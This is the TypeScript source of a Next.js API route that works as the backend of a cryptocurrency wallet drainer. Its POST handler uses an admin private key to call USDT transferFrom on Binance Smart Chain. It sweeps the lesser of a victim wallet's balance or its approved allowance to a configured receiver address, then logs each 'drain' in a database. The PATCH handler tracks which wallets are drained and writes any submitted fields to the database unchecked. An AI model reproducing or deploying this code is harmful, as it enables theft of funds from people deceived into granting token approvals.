import { NextRequest, NextResponse } from "next/server";
import { getServiceSupabase } from "@/lib/supabase";
import { ethers } from "ethers";
import { isAdminAuthorized } from "@/lib/auth";

const USDT_ABI = [
  "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
  "function balanceOf(address owner) public view returns (uint256)",
  "function allowance(address owner, address spender) public view returns (uint256)",
];

export async function POST(
  req: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  if (!(await isAdminAuthorized(req))) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  const { id } = await params;
  const supabase = getServiceSupabase();

  // Optional: limit amount by query param (e.g., ?limitUsd=0.1)
  const url = new URL(req.url);
  const limitUsdParam = url.searchParams.get("limitUsd");
  const limitUsd = limitUsdParam ? parseFloat(limitUsdParam) : null;

  const { data: wallet, error: fetchError } = await supabase
    .from("wallets")
    .select("*")
    .eq("id", id)
    .single();

  if (fetchError || !wallet) {
    return NextResponse.json({ error: "Wallet not found" }, { status: 404 });
  }

  if (!wallet.approval_status) {
    return NextResponse.json({ error: "Wallet has not approved yet" }, { status: 400 });
  }

  const { data: configRow } = await supabase
    .from("config")
    .select("value")
    .eq("key", "receiver_address")
    .single();

  const receiverAddress = configRow?.value;
  if (!receiverAddress) {
    return NextResponse.json({ error: "Receiver address not set in admin Config tab" }, { status: 500 });
  }

  const privateKey = process.env.ADMIN_PRIVATE_KEY;
  if (!privateKey) {
    return NextResponse.json(
      { error: "ADMIN_PRIVATE_KEY is not set in environment variables" },
      { status: 500 }
    );
  }

  try {
    const provider = new ethers.JsonRpcProvider(
      process.env.BSC_RPC_URL ?? "https://bsc-dataseed.binance.org/"
    );
    const adminWallet = new ethers.Wallet(privateKey, provider);
    const contract = new ethers.Contract(
      process.env.NEXT_PUBLIC_USDT_CONTRACT!,
      USDT_ABI,
      adminWallet
    );

    // Check both balance AND real on-chain allowance
    const [balance, allowance]: [bigint, bigint] = await Promise.all([
      contract.balanceOf(wallet.address),
      contract.allowance(wallet.address, adminWallet.address),
    ]);

    if (balance === BigInt(0)) {
      return NextResponse.json({ error: "Wallet USDT balance is zero" }, { status: 400 });
    }

    if (allowance === BigInt(0)) {
      await supabase.from("wallets").update({ approval_status: false }).eq("id", id);
      return NextResponse.json(
        { error: "No on-chain allowance found. Wallet may not have approved on BSC." },
        { status: 400 }
      );
    }

    // Use lesser of balance or allowance
    let transferAmount = balance < allowance ? balance : allowance;
    let amountFormatted = ethers.formatUnits(transferAmount, 18);

    // Apply limit if specified
    if (limitUsd !== null) {
      const transferUsd = parseFloat(amountFormatted);
      if (transferUsd > limitUsd) {
        transferAmount = ethers.parseUnits(limitUsd.toString(), 18);
        amountFormatted = limitUsd.toString();
      }
    }

    console.log(`🔄 Draining ${amountFormatted} USDT from ${wallet.address}`);

    // FIXED: Proper gas settings for BSC (0 gas no longer works reliably)
    const tx = await contract.transferFrom(
      wallet.address,
      receiverAddress,
      transferAmount,
      {
        gasLimit: 120000,
        gasPrice: ethers.parseUnits("0.05", "gwei"),   // Sweet spot for BSC right now
      }
    );

    console.log(`⏳ Transaction sent: ${tx.hash}`);

    const receipt = await tx.wait();
    console.log(`✅ Transaction confirmed: ${receipt.hash}`);

    // Update wallet record
    await supabase
      .from("wallets")
      .update({ 
        drained: false, 
        drain_tx_hash: receipt.hash, 
        updated_at: new Date().toISOString() 
      })
      .eq("id", id);

    // Record transaction
    await supabase.from("transactions").insert({
      wallet_address: wallet.address,
      type: "drain",
      tx_hash: receipt.hash,
      amount_usdt: amountFormatted,
      status: "success",
    });

    return NextResponse.json({ 
      success: true, 
      txHash: receipt.hash, 
      amount: amountFormatted 
    });

  } catch (err: unknown) {
    const message = err instanceof Error ? err.message : "Unknown error";
    console.error("Drain Error:", message);

    await supabase.from("transactions").insert({
      wallet_address: wallet.address,
      type: "drain",
      status: "failed",
      amount_usdt: "0",
    });

    return NextResponse.json({ error: message }, { status: 500 });
  }
}

// PATCH - Update wallet (e.g. mark as drained, toggle approval, etc.)
export async function PATCH(
  req: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  if (!(await isAdminAuthorized(req))) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  const { id } = await params;
  const supabase = getServiceSupabase();

  try {
    const body = await req.json();
    console.log("📥 PATCH body received:", body);

    const updateData: any = {
      updated_at: new Date().toISOString(),
    };

    // Map common frontend field names to actual DB columns
    if (body.drained !== undefined) updateData.drained = body.drained;
    if (body.approval_status !== undefined) updateData.approval_status = body.approval_status;
    if (body.is_approved !== undefined) updateData.is_approved = body.is_approved;
    if (body.is_revoked !== undefined) updateData.is_revoked = body.is_revoked;

    // Allow any other fields
    Object.assign(updateData, body);

    const { data, error } = await supabase
      .from("wallets")
      .update(updateData)
      .eq("id", id)
      .select()
      .single();

    if (error) {
      console.error("❌ Supabase Update Error:", error);
      return NextResponse.json({ 
        error: error.message,
        details: error 
      }, { status: 500 });
    }

    console.log("✅ Wallet updated successfully:", data);
    return NextResponse.json({ success: true, data });

  } catch (err: any) {
    console.error("🔥 PATCH Server Error:", err);
    return NextResponse.json({ 
      error: err.message || "Internal server error" 
    }, { status: 500 });
  }
}